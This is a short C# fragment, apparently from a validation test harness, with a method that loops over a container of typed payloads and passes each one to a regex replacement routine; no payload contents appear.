        public static void TestPayloads()
        {
            foreach(KeyValuePair<TypesToValidate, IList<IPayload>> items in PayloadContainer.Payloads)
            {
                foreach(var item in items.Value)
                {
                    ReplaceRegex(item.Payload);
                }
            }
        }

